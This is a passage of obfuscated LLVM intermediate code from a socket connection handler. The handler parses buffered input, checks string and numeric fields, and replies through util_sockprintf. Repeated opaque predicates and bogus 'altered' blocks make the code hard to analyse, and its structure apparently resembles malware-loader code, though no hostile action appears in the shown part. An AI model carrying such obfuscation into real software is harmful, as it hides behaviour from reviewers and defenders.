  %230 = load i32, i32* @x.15
  %231 = load i32, i32* @y.16
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br i1 %229, label %238, label %263

; <label>:238:                                    ; preds = %originalBBpart227
  %239 = load i32, i32* @x.15
  %240 = load i32, i32* @y.16
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %238
  %247 = load i8, i8* %9, align 1
  %248 = sext i8 %247 to i32
  %249 = icmp ne i32 %248, 0
  %250 = load i32, i32* @x.15
  %251 = load i32, i32* @y.16
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %249, label %258, label %263

; <label>:258:                                    ; preds = %originalBBpart231
  %259 = load i8*, i8** %5, align 8
  %260 = load i32, i32* %7, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds i8, i8* %259, i64 %261
  store i8* %262, i8** %11, align 8
  br label %263

; <label>:263:                                    ; preds = %258, %originalBBpart231, %originalBBpart227, %originalBBpart223
  br label %264

; <label>:264:                                    ; preds = %263, %191
  %265 = load i32, i32* @x.15
  %266 = load i32, i32* @y.16
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %264
  store i8 0, i8* %9, align 1
  %273 = load i32, i32* @x.15
  %274 = load i32, i32* @y.16
  %275 = sub i32 %273, 1
  %276 = mul i32 %273, %275
  %277 = urem i32 %276, 2
  %278 = icmp eq i32 %277, 0
  %279 = icmp slt i32 %274, 10
  %280 = or i1 %278, %279
  br i1 %280, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %281

; <label>:281:                                    ; preds = %originalBBpart235, %182
  br label %282

; <label>:282:                                    ; preds = %281
  %283 = load i32, i32* %7, align 4
  %284 = add nsw i32 %283, 1
  store i32 %284, i32* %7, align 4
  br label %103

; <label>:285:                                    ; preds = %103
  %286 = load i8*, i8** %10, align 8
  %287 = icmp ne i8* %286, null
  br i1 %287, label %288, label %491

; <label>:288:                                    ; preds = %285
  %289 = load i8*, i8** %11, align 8
  %290 = icmp ne i8* %289, null
  br i1 %290, label %291, label %491

; <label>:291:                                    ; preds = %288
  %292 = load i32, i32* @x.15
  %293 = load i32, i32* @y.16
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %291
  %300 = load i8*, i8** %10, align 8
  %301 = call i32 @atoi(i8* %300) #6
  store i32 %301, i32* %12, align 4
  %302 = load i8*, i8** %11, align 8
  %303 = call i64 @strlen(i8* %302) #6
  %304 = trunc i64 %303 to i32
  store i32 %304, i32* %13, align 4
  %305 = load i32, i32* %12, align 4
  %306 = icmp ne i32 %305, 1
  %307 = load i32, i32* @x.15
  %308 = load i32, i32* @y.16
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %306, label %315, label %329

; <label>:315:                                    ; preds = %originalBBpart239
  %316 = load i8*, i8** %11, align 8
  %317 = call i32 @strcmp(i8* %316, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i32 0, i32 0)) #6
  %318 = icmp eq i32 %317, 0
  br i1 %318, label %323, label %319

; <label>:319:                                    ; preds = %315
  %320 = load i8*, i8** %11, align 8
  %321 = call i32 @strcmp(i8* %320, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0)) #6
  %322 = icmp eq i32 %321, 0
  br i1 %322, label %323, label %329

; <label>:323:                                    ; preds = %319, %315
  %324 = load %struct.connection*, %struct.connection** %3, align 8
  %325 = getelementptr inbounds %struct.connection, %struct.connection* %324, i32 0, i32 4
  %326 = load i32, i32* %325, align 8
  %327 = load i32, i32* %12, align 4
  %328 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %326, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i32 0, i32 0), i32 %327)
  br label %474

; <label>:329:                                    ; preds = %319, %originalBBpart239
  %330 = load i32, i32* %12, align 4
  %331 = icmp sgt i32 %330, 400
  br i1 %331, label %332, label %473

; <label>:332:                                    ; preds = %329
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %7, align 4
  br label %333

; <label>:333:                                    ; preds = %441, %332
  %334 = load i32, i32* %7, align 4
  %335 = load i32, i32* %13, align 4
  %336 = icmp slt i32 %334, %335
  br i1 %336, label %337, label %444

; <label>:337:                                    ; preds = %333
  %338 = load i8*, i8** %11, align 8
  %339 = load i32, i32* %7, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds i8, i8* %338, i64 %340
  %342 = load i8, i8* %341, align 1
  %343 = sext i8 %342 to i32
  %344 = icmp sge i32 %343, 48
  br i1 %344, label %345, label %356

; <label>:345:                                    ; preds = %337
  %346 = load i8*, i8** %11, align 8
  %347 = load i32, i32* %7, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds i8, i8* %346, i64 %348
  %350 = load i8, i8* %349, align 1
  %351 = sext i8 %350 to i32
  %352 = icmp sle i32 %351, 57
  br i1 %352, label %353, label %356

; <label>:353:                                    ; preds = %345
  %354 = load i32, i32* %14, align 4
  %355 = add nsw i32 %354, 1
  store i32 %355, i32* %14, align 4
  br label %440

; <label>:356:                                    ; preds = %345, %337
  %357 = load i32, i32* @x.15
  %358 = load i32, i32* @y.16
  %359 = sub i32 %357, 1
  %360 = mul i32 %357, %359
  %361 = urem i32 %360, 2
  %362 = icmp eq i32 %361, 0
  %363 = icmp slt i32 %358, 10
  %364 = or i1 %362, %363
  br i1 %364, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %356
  %365 = load i8*, i8** %11, align 8
  %366 = load i32, i32* %7, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds i8, i8* %365, i64 %367
  %369 = load i8, i8* %368, align 1
  %370 = sext i8 %369 to i32
  %371 = icmp sge i32 %370, 97
  %372 = load i32, i32* @x.15
  %373 = load i32, i32* @y.16
  %374 = sub i32 %372, 1
  %375 = mul i32 %372, %374
  %376 = urem i32 %375, 2
  %377 = icmp eq i32 %376, 0
  %378 = icmp slt i32 %373, 10
  %379 = or i1 %377, %378
  br i1 %379, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %371, label %380, label %388

; <label>:380:                                    ; preds = %originalBBpart243
  %381 = load i8*, i8** %11, align 8
  %382 = load i32, i32* %7, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds i8, i8* %381, i64 %383
  %385 = load i8, i8* %384, align 1
  %386 = sext i8 %385 to i32
  %387 = icmp sle i32 %386, 122
  br i1 %387, label %420, label %388

; <label>:388:                                    ; preds = %380, %originalBBpart243
  %389 = load i32, i32* @x.15
  %390 = load i32, i32* @y.16
  %391 = sub i32 %389, 1
  %392 = mul i32 %389, %391
  %393 = urem i32 %392, 2
  %394 = icmp eq i32 %393, 0
  %395 = icmp slt i32 %390, 10
  %396 = or i1 %394, %395
  br i1 %396, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %388
  %397 = load i8*, i8** %11, align 8
  %398 = load i32, i32* %7, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds i8, i8* %397, i64 %399
  %401 = load i8, i8* %400, align 1
  %402 = sext i8 %401 to i32
  %403 = icmp sge i32 %402, 65
  %404 = load i32, i32* @x.15
  %405 = load i32, i32* @y.16
  %406 = sub i32 %404, 1
  %407 = mul i32 %404, %406
  %408 = urem i32 %407, 2
  %409 = icmp eq i32 %408, 0
  %410 = icmp slt i32 %405, 10
  %411 = or i1 %409, %410
  br i1 %411, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br i1 %403, label %412, label %439

; <label>:412:                                    ; preds = %originalBBpart247
  %413 = load i8*, i8** %11, align 8
  %414 = load i32, i32* %7, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds i8, i8* %413, i64 %415
  %417 = load i8, i8* %416, align 1
  %418 = sext i8 %417 to i32
  %419 = icmp sle i32 %418, 90
  br i1 %419, label %420, label %439

; <label>:420:                                    ; preds = %412, %380
  %421 = load i32, i32* @x.15
  %422 = load i32, i32* @y.16
  %423 = sub i32 %421, 1
  %424 = mul i32 %421, %423
  %425 = urem i32 %424, 2
  %426 = icmp eq i32 %425, 0
  %427 = icmp slt i32 %422, 10
  %428 = or i1 %426, %427
  br i1 %428, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %420
  %429 = load i32, i32* %15, align 4
  %430 = add nsw i32 %429, 1
  store i32 %430, i32* %15, align 4
  %431 = load i32, i32* @x.15
  %432 = load i32, i32* @y.16
  %433 = sub i32 %431, 1
  %434 = mul i32 %431, %433
  %435 = urem i32 %434, 2
  %436 = icmp eq i32 %435, 0
  %437 = icmp slt i32 %432, 10
  %438 = or i1 %436, %437
  br i1 %438, label %originalBBpart254, label %originalBB49alteredBB

originalBBpart254:                                ; preds = %originalBB49
  br label %444

; <label>:439:                                    ; preds = %412, %originalBBpart247
  br label %440

; <label>:440:                                    ; preds = %439, %353
  br label %441

; <label>:441:                                    ; preds = %440
  %442 = load i32, i32* %7, align 4
  %443 = add nsw i32 %442, 1
  store i32 %443, i32* %7, align 4
  br label %333

; <label>:444:                                    ; preds = %originalBBpart254, %333
  %445 = load i32, i32* %15, align 4
  %446 = icmp eq i32 %445, 0
  br i1 %446, label %447, label %456

; <label>:447:                                    ; preds = %444
  %448 = load i32, i32* %14, align 4
  %449 = icmp sgt i32 %448, 0
  br i1 %449, label %450, label %456

; <label>:450:                                    ; preds = %447
  %451 = load %struct.connection*, %struct.connection** %3, align 8
  %452 = getelementptr inbounds %struct.connection, %struct.connection* %451, i32 0, i32 4
  %453 = load i32, i32* %452, align 8
  %454 = load i32, i32* %12, align 4
  %455 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %453, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i32 0, i32 0), i32 %454)
  br label %456

; <label>:456:                                    ; preds = %450, %447, %444
  %457 = load i32, i32* @x.15
  %458 = load i32, i32* @y.16
  %459 = sub i32 %457, 1
  %460 = mul i32 %457, %459
  %461 = urem i32 %460, 2
  %462 = icmp eq i32 %461, 0
  %463 = icmp slt i32 %458, 10
  %464 = or i1 %462, %463
  br i1 %464, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %456
  %465 = load i32, i32* @x.15
  %466 = load i32, i32* @y.16
  %467 = sub i32 %465, 1
  %468 = mul i32 %465, %467
  %469 = urem i32 %468, 2
  %470 = icmp eq i32 %469, 0
  %471 = icmp slt i32 %466, 10
  %472 = or i1 %470, %471
  br i1 %472, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br label %473

; <label>:473:                                    ; preds = %originalBBpart258, %329
  br label %474

; <label>:474:                                    ; preds = %473, %323
  %475 = load i32, i32* @x.15
  %476 = load i32, i32* @y.16
  %477 = sub i32 %475, 1
  %478 = mul i32 %475, %477
  %479 = urem i32 %478, 2
  %480 = icmp eq i32 %479, 0
  %481 = icmp slt i32 %476, 10
  %482 = or i1 %480, %481
  br i1 %482, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %474
  %483 = load i32, i32* @x.15
  %484 = load i32, i32* @y.16
  %485 = sub i32 %483, 1
  %486 = mul i32 %483, %485
  %487 = urem i32 %486, 2
  %488 = icmp eq i32 %487, 0
  %489 = icmp slt i32 %484, 10
  %490 = or i1 %488, %489
  br i1 %490, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br label %491

; <label>:491:                                    ; preds = %originalBBpart262, %288, %285
  %492 = load i32, i32* @x.15
  %493 = load i32, i32* @y.16
  %494 = sub i32 %492, 1
  %495 = mul i32 %492, %494
  %496 = urem i32 %495, 2
  %497 = icmp eq i32 %496, 0
  %498 = icmp slt i32 %493, 10
  %499 = or i1 %497, %498
  br i1 %499, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %491
  %500 = load %struct.connection*, %struct.connection** %3, align 8
  %501 = getelementptr inbounds %struct.connection, %struct.connection* %500, i32 0, i32 15
  %502 = getelementptr inbounds [8192 x i8], [8192 x i8]* %501, i32 0, i32 0
  %503 = load i32, i32* %6, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds i8, i8* %502, i64 %504
  %506 = getelementptr inbounds i8, i8* %505, i64 1
  store i8* %506, i8** %5, align 8
  %507 = load i32, i32* @x.15
  %508 = load i32, i32* @y.16
  %509 = sub i32 %507, 1
  %510 = mul i32 %507, %509
  %511 = urem i32 %510, 2
  %512 = icmp eq i32 %511, 0
  %513 = icmp slt i32 %508, 10
  %514 = or i1 %512, %513
  br i1 %514, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %515

; <label>:515:                                    ; preds = %originalBBpart266, %originalBBpart24
  br label %516

; <label>:516:                                    ; preds = %515, %originalBBpart2
  %517 = load i32, i32* @x.15
  %518 = load i32, i32* @y.16
  %519 = sub i32 %517, 1
  %520 = mul i32 %517, %519
  %521 = urem i32 %520, 2
  %522 = icmp eq i32 %521, 0
  %523 = icmp slt i32 %518, 10
  %524 = or i1 %522, %523
  br i1 %524, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %516
  %525 = load i32, i32* @x.15
  %526 = load i32, i32* @y.16
  %527 = sub i32 %525, 1
  %528 = mul i32 %525, %527
  %529 = urem i32 %528, 2
  %530 = icmp eq i32 %529, 0
  %531 = icmp slt i32 %526, 10
  %532 = or i1 %530, %531
  br i1 %532, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br label %533

; <label>:533:                                    ; preds = %originalBBpart270
  %534 = load i32, i32* @x.15
  %535 = load i32, i32* @y.16
  %536 = sub i32 %534, 1
  %537 = mul i32 %534, %536
  %538 = urem i32 %537, 2
  %539 = icmp eq i32 %538, 0
  %540 = icmp slt i32 %535, 10
  %541 = or i1 %539, %540
  br i1 %541, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %533
  %542 = load i32, i32* %6, align 4
  %543 = add nsw i32 %542, 1
  store i32 %543, i32* %6, align 4
  %544 = load i32, i32* @x.15
  %545 = load i32, i32* @y.16
  %546 = sub i32 %544, 1
  %547 = mul i32 %544, %546
  %548 = urem i32 %547, 2
  %549 = icmp eq i32 %548, 0
  %550 = icmp slt i32 %545, 10
  %551 = or i1 %549, %550
  br i1 %551, label %originalBBpart278, label %originalBB72alteredBB

originalBBpart278:                                ; preds = %originalBB72
  br label %27

; <label>:552:                                    ; preds = %38
  %553 = load i32, i32* %4, align 4
  %554 = icmp eq i32 %553, -1
  br i1 %554, label %555, label %598

; <label>:555:                                    ; preds = %552
  %556 = load %struct.connection*, %struct.connection** %3, align 8
  %557 = getelementptr inbounds %struct.connection, %struct.connection* %556, i32 0, i32 9
  %558 = load i16, i16* %557, align 8
  %559 = zext i16 %558 to i32
  %560 = icmp sgt i32 %559, 7168
  br i1 %560, label %561, label %581

; <label>:561:                                    ; preds = %555
  %562 = load %struct.connection*, %struct.connection** %3, align 8
  %563 = getelementptr inbounds %struct.connection, %struct.connection* %562, i32 0, i32 15
  %564 = getelementptr inbounds [8192 x i8], [8192 x i8]* %563, i32 0, i32 0
  %565 = load %struct.connection*, %struct.connection** %3, align 8
  %566 = getelementptr inbounds %struct.connection, %struct.connection* %565, i32 0, i32 15
  %567 = getelementptr inbounds [8192 x i8], [8192 x i8]* %566, i32 0, i32 0
  %568 = getelementptr inbounds i8, i8* %567, i64 6144
  %569 = load %struct.connection*, %struct.connection** %3, align 8
  %570 = getelementptr inbounds %struct.connection, %struct.connection* %569, i32 0, i32 9
  %571 = load i16, i16* %570, align 8
  %572 = zext i16 %571 to i32
  %573 = sub nsw i32 %572, 6144
  %574 = sext i32 %573 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %564, i8* %568, i64 %574, i32 1, i1 false)
  %575 = load %struct.connection*, %struct.connection** %3, align 8
  %576 = getelementptr inbounds %struct.connection, %struct.connection* %575, i32 0, i32 9
  %577 = load i16, i16* %576, align 8
  %578 = zext i16 %577 to i32
  %579 = sub nsw i32 %578, 6144
  %580 = trunc i32 %579 to i16
  store i16 %580, i16* %576, align 8
  br label %581

; <label>:581:                                    ; preds = %561, %555
  %582 = load i32, i32* @x.15
  %583 = load i32, i32* @y.16
  %584 = sub i32 %582, 1
  %585 = mul i32 %582, %584
  %586 = urem i32 %585, 2
  %587 = icmp eq i32 %586, 0
  %588 = icmp slt i32 %583, 10
  %589 = or i1 %587, %588
  br i1 %589, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %581
  store i32 0, i32* %2, align 4
  %590 = load i32, i32* @x.15
  %591 = load i32, i32* @y.16
  %592 = sub i32 %590, 1
  %593 = mul i32 %590, %592
  %594 = urem i32 %593, 2
  %595 = icmp eq i32 %594, 0
  %596 = icmp slt i32 %591, 10
  %597 = or i1 %595, %596
  br i1 %597, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br label %691

; <label>:598:                                    ; preds = %552
  %599 = load i32, i32* @x.15
  %600 = load i32, i32* @y.16
  %601 = sub i32 %599, 1
  %602 = mul i32 %599, %601
  %603 = urem i32 %602, 2
  %604 = icmp eq i32 %603, 0
  %605 = icmp slt i32 %600, 10
  %606 = or i1 %604, %605
  br i1 %606, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %598
  store i32 0, i32* %6, align 4
  %607 = load i32, i32* @x.15
  %608 = load i32, i32* @y.16
  %609 = sub i32 %607, 1
  %610 = mul i32 %607, %609
  %611 = urem i32 %610, 2
  %612 = icmp eq i32 %611, 0
  %613 = icmp slt i32 %608, 10
  %614 = or i1 %612, %613
  br i1 %614, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %615

; <label>:615:                                    ; preds = %670, %originalBBpart286
  %616 = load i32, i32* %6, align 4
  %617 = load %struct.connection*, %struct.connection** %3, align 8
  %618 = getelementptr inbounds %struct.connection, %struct.connection* %617, i32 0, i32 9
  %619 = load i16, i16* %618, align 8
  %620 = zext i16 %619 to i32
  %621 = icmp slt i32 %616, %620
  br i1 %621, label %622, label %673

; <label>:622:                                    ; preds = %615
  %623 = load %struct.connection*, %struct.connection** %3, align 8
  %624 = getelementptr inbounds %struct.connection, %struct.connection* %623, i32 0, i32 15
  %625 = load i32, i32* %6, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds [8192 x i8], [8192 x i8]* %624, i64 0, i64 %626
  %628 = load i8, i8* %627, align 1
  %629 = zext i8 %628 to i32
  %630 = icmp eq i32 %629, 0
  br i1 %630, label %631, label %653

; <label>:631:                                    ; preds = %622
  %632 = load i32, i32* @x.15
  %633 = load i32, i32* @y.16
  %634 = sub i32 %632, 1
  %635 = mul i32 %632, %634
  %636 = urem i32 %635, 2
  %637 = icmp eq i32 %636, 0
  %638 = icmp slt i32 %633, 10
  %639 = or i1 %637, %638
  br i1 %639, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %631
  %640 = load %struct.connection*, %struct.connection** %3, align 8
  %641 = getelementptr inbounds %struct.connection, %struct.connection* %640, i32 0, i32 15
  %642 = load i32, i32* %6, align 4
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds [8192 x i8], [8192 x i8]* %641, i64 0, i64 %643
  store i8 32, i8* %644, align 1
  %645 = load i32, i32* @x.15
  %646 = load i32, i32* @y.16
  %647 = sub i32 %645, 1
  %648 = mul i32 %645, %647
  %649 = urem i32 %648, 2
  %650 = icmp eq i32 %649, 0
  %651 = icmp slt i32 %646, 10
  %652 = or i1 %650, %651
  br i1 %652, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br label %653

; <label>:653:                                    ; preds = %originalBBpart290, %622
  %654 = load i32, i32* @x.15
  %655 = load i32, i32* @y.16
  %656 = sub i32 %654, 1
  %657 = mul i32 %654, %656
  %658 = urem i32 %657, 2
  %659 = icmp eq i32 %658, 0
  %660 = icmp slt i32 %655, 10
  %661 = or i1 %659, %660
  br i1 %661, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %653
  %662 = load i32, i32* @x.15
  %663 = load i32, i32* @y.16
  %664 = sub i32 %662, 1
  %665 = mul i32 %662, %664
  %666 = urem i32 %665, 2
  %667 = icmp eq i32 %666, 0
  %668 = icmp slt i32 %663, 10
  %669 = or i1 %667, %668
  br i1 %669, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br label %670

; <label>:670:                                    ; preds = %originalBBpart294
  %671 = load i32, i32* %6, align 4
  %672 = add nsw i32 %671, 1
  store i32 %672, i32* %6, align 4
  br label %615

; <label>:673:                                    ; preds = %615
  %674 = load i32, i32* @x.15
  %675 = load i32, i32* @y.16
  %676 = sub i32 %674, 1
  %677 = mul i32 %674, %676
  %678 = urem i32 %677, 2
  %679 = icmp eq i32 %678, 0
  %680 = icmp slt i32 %675, 10
  %681 = or i1 %679, %680
  br i1 %681, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %673
  %682 = load i32, i32* %4, align 4
  store i32 %682, i32* %2, align 4
  %683 = load i32, i32* @x.15
  %684 = load i32, i32* @y.16
  %685 = sub i32 %683, 1
  %686 = mul i32 %683, %685
  %687 = urem i32 %686, 2
  %688 = icmp eq i32 %687, 0
  %689 = icmp slt i32 %684, 10
  %690 = or i1 %688, %689
  br i1 %690, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br label %691

; <label>:691:                                    ; preds = %originalBBpart298, %originalBBpart282
  %692 = load i32, i32* %2, align 4
  ret i32 %692

originalBBalteredBB:                              ; preds = %originalBB, %50
  %693 = load %struct.connection*, %struct.connection** %3, align 8
  %694 = getelementptr inbounds %struct.connection, %struct.connection* %693, i32 0, i32 15
  %695 = load i32, i32* %6, align 4
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds [8192 x i8], [8192 x i8]* %694, i64 0, i64 %696
  store i8 0, i8* %697, align 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %72
  %698 = load %struct.connection*, %struct.connection** %3, align 8
  %699 = getelementptr inbounds %struct.connection, %struct.connection* %698, i32 0, i32 15
  %700 = load i32, i32* %6, align 4
  %701 = sext i32 %700 to i64
  %702 = getelementptr inbounds [8192 x i8], [8192 x i8]* %699, i64 0, i64 %701
  %703 = load i8, i8* %702, align 1
  %704 = zext i8 %703 to i32
  %705 = icmp eq i32 %704, 10
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %124
  %706 = load i8*, i8** %5, align 8
  %707 = load i32, i32* %7, align 4
  %708 = sext i32 %707 to i64
  %709 = getelementptr inbounds i8, i8* %706, i64 %708
  %710 = load i8, i8* %709, align 1
  %711 = sext i8 %710 to i32
  %712 = icmp eq i32 %711, 9
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %163
  %713 = load i8, i8* %8, align 1
  %_ = sub i8 %713, 1
  %gen = mul i8 %_, 1
  %_11 = sub i8 %713, 1
  %gen12 = mul i8 %_11, 1
  %_13 = sub i8 0, %713
  %gen14 = add i8 %_13, 1
  %_15 = sub i8 0, %713
  %gen16 = add i8 %_15, 1
  %_17 = shl i8 %713, 1
  %714 = add i8 %713, 1
  store i8 %714, i8* %8, align 1
  br label %originalBB10

originalBB21alteredBB:                            ; preds = %originalBB21, %198
  %715 = load i8, i8* %8, align 1
  %716 = zext i8 %715 to i32
  %717 = icmp sge i32 %716, 3
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %218
  %718 = load i8, i8* %8, align 1
  %719 = zext i8 %718 to i32
  %720 = icmp sle i32 %719, 5
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %238
  %721 = load i8, i8* %9, align 1
  %722 = sext i8 %721 to i32
  %723 = icmp ne i32 %722, 0
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %264
  store i8 0, i8* %9, align 1
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %291
  %724 = load i8*, i8** %10, align 8
  %725 = call i32 @atoi(i8* %724) #6
  store i32 %725, i32* %12, align 4
  %726 = load i8*, i8** %11, align 8
  %727 = call i64 @strlen(i8* %726) #6
  %728 = trunc i64 %727 to i32
  store i32 %728, i32* %13, align 4
  %729 = load i32, i32* %12, align 4
  %730 = icmp ne i32 %729, 1
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %356
  %731 = load i8*, i8** %11, align 8
  %732 = load i32, i32* %7, align 4
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds i8, i8* %731, i64 %733
  %735 = load i8, i8* %734, align 1
  %736 = sext i8 %735 to i32
  %737 = icmp sge i32 %736, 97
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %388
  %738 = load i8*, i8** %11, align 8
  %739 = load i32, i32* %7, align 4
  %740 = sext i32 %739 to i64
  %741 = getelementptr inbounds i8, i8* %738, i64 %740
  %742 = load i8, i8* %741, align 1
  %743 = sext i8 %742 to i32
  %744 = icmp sge i32 %743, 65
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %420
  %745 = load i32, i32* %15, align 4
  %_50 = shl i32 %745, 1
  %_51 = sub i32 0, %745
  %gen52 = add i32 %_51, 1
  %746 = add nsw i32 %745, 1
  store i32 %746, i32* %15, align 4
  br label %originalBB49

originalBB56alteredBB:                            ; preds = %originalBB56, %456
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %474
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %491
  %747 = load %struct.connection*, %struct.connection** %3, align 8
  %748 = getelementptr inbounds %struct.connection, %struct.connection* %747, i32 0, i32 15
  %749 = getelementptr inbounds [8192 x i8], [8192 x i8]* %748, i32 0, i32 0
  %750 = load i32, i32* %6, align 4
  %751 = sext i32 %750 to i64
  %752 = getelementptr inbounds i8, i8* %749, i64 %751
  %753 = getelementptr inbounds i8, i8* %752, i64 1
  store i8* %753, i8** %5, align 8
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %516
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %533
  %754 = load i32, i32* %6, align 4
  %_73 = sub i32 0, %754
  %gen74 = add i32 %_73, 1
  %_75 = sub i32 %754, 1
  %gen76 = mul i32 %_75, 1
  %755 = add nsw i32 %754, 1
  store i32 %755, i32* %6, align 4
  br label %originalBB72

originalBB80alteredBB:                            ; preds = %originalBB80, %581
  store i32 0, i32* %2, align 4
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %598
  store i32 0, i32* %6, align 4
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %631
  %756 = load %struct.connection*, %struct.connection** %3, align 8
  %757 = getelementptr inbounds %struct.connection, %struct.connection* %756, i32 0, i32 15
  %758 = load i32, i32* %6, align 4
  %759 = sext i32 %758 to i64
  %760 = getelementptr inbounds [8192 x i8], [8192 x i8]* %757, i64 0, i64 %759
  store i8 32, i8* %760, align 1
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %653
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %673
  %761 = load i32, i32* %4, align 4
  store i32 %761, i32* %2, align 4
  br label %originalBB96
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
